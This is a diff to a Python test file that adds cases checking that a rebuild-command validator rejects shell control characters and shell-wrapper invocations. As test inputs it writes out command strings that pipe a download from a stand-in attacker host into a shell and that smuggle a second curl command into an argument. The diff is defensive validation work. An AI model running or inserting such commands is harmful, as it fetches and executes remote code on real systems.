@@ -71,6 +71,10 @@ def test_coerce_rebuild_command_rejects_shell_control(akp):
     ]
     with pytest.raises(ValueError, match="shell control"):
         akp._coerce_rebuild_command("python setup.py develop && curl http://attacker | sh")
+    with pytest.raises(ValueError, match="shell control"):
+        akp._coerce_rebuild_command(["python", "setup.py", "develop;curl http://attacker"])
+    with pytest.raises(ValueError, match="shell command string"):
+        akp._coerce_rebuild_command(["bash", "-lc", "python setup.py develop"])
 
 
 def test_parse_manifest_empty_raises(akp):
